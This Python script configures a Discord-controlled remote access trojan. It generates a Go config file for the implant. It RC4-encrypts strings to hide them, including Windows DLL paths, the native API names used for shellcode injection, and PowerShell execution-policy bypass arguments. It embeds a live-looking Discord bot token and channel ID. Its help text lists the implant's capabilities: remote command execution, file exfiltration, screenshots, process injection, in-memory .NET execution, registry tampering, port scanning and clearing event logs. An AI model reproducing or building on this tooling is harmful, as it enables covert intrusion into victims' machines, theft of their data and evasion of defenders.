#!/usr/bin/env python3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from base64 import b64encode
from os import urandom

def encrypt(data):
    RC4 = algorithms.ARC4(RC4Key.encode())
    cipher = Cipher(RC4, mode=None)
    encryptor = cipher.encryptor()
    ct = encryptor.update(data)
    ct += encryptor.finalize()
    return b64encode(ct).decode()

TOKEN = "Bot MTA4MDgxMTIxNDAxMzIxMDY1NQ.GsicEI.l7FMAOq24qJD941OU-eV8MVLIaIzn7UxX8Tm0w" #change 
CHANNEL_ID = "1080810331309346908" #change

RC4Key = urandom(16).hex()

HELP = encrypt(b"""
!help -> show this help message
!shell <command> -> execute a command in cmd shell
!powershell <command> -> execute command with powershell
!wmic <command> -> run wmic with the provided args
!cd <dir> -> change directory
!url <link> -> downloads from a url to this device
!download <file> -> downloads from from remote device to discord server
!upload (file reply) -> uploads file to remote device
!screenshot -> takes screenshot
!ls -> list directory
!pwd -> print current working directory
!rm <file> -> deletes file
!drives -> list drives on windows
!scans <host> <port> <protocol> -> scans a given IP/s for open ports
!getpid -> get process ID
!inject (file reply) <optional pid, time, enc_key> -> injects shellcode bin file into a given process, examples:
	!inject (inject into self process with default sleep time)
	!inject -pid <pid> -t <time> -e <RC4 key>
!clr (file reply) <optioanl exe args> -> executes a .NET binary in memory 
!idle -> get system idle time
!kill <pid> -> kills a process by its PID 
!ps -> get all running processes
!reg <enumkey, queryval, setval, deletekey, createkey, deleteval> <options> -> interact with the registry, examples:
	!reg enumkey -k HKEY_CURRENT_USER\SOFTWARE\Google
	!reg queryval -k HKEY_CURRENT_USER\SOFTWARE\Google -v Test
	!reg setval -k HKEY_CURRENT_USER\SOFTWARE\Google -v New -t DWORD -d 100200
!clearev (Admin Privilege) -> clears windows event logs 
!ifconfig -> get network interfaces
""") 

KERNEL32 = encrypt(b"C:\\Windows\\System32\\kernel32.dll")
KERNELBASE = encrypt(b"C:\\Windows\\System32\\kernelbase.dll")
NTDLL = encrypt(b"C:\\Windows\\System32\\ntdll.dll")
CMD = encrypt(b"C:\\Windows\\System32\\cmd.exe")
POWERSHELL = encrypt(b"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
WMI = encrypt(b"C:\\Windows\\System32\\wbem\\WMIC.exe")
NTPROTECTVIRTUAL = encrypt(b"NtProtectVirtualMemory")
NTWRITEVIRTUAL = encrypt(b"NtWriteVirtualMemory")
NTALLOCATEVIRTUAL = encrypt(b"NtAllocateVirtualMemory")
NTCREATETHREAD = encrypt(b"NtCreateThreadEx")
POWERSHELL_ARGS = encrypt(b"-command -exec bypass")
config = f"""package config

const (
	TOKEN         = "{TOKEN}"
	CHANNEL_ID    = "{CHANNEL_ID}"
	MUTEX_STRING  = "{urandom(10).hex()}"
	HELP          = "{HELP}"
	MESSAGE_LIMIT = 2000
	POLL_INTERVAL = 1 // seconds
	KERNEL32 = "{KERNEL32}"
	KERNELBASE = "{KERNELBASE}"
	NTDLL = "{NTDLL}"
    CMD = "{CMD}"
	POWERSHELL = "{POWERSHELL}"
    POWERSHELL_ARGS = "{POWERSHELL_ARGS}"
	WMI = "{WMI}"
	NTPROTECTVIRTUAL = "{NTPROTECTVIRTUAL}" 
	NTWRITEVIRTUAL = "{NTWRITEVIRTUAL}"
	NTCREATETHREAD = "{NTCREATETHREAD}"
	NTALLOCATEVIRTUAL = "{NTALLOCATEVIRTUAL}"
    RC4Key = "{RC4Key}"
)
"""

with open("config/config.go", "wb") as w:
    w.write(config.encode())
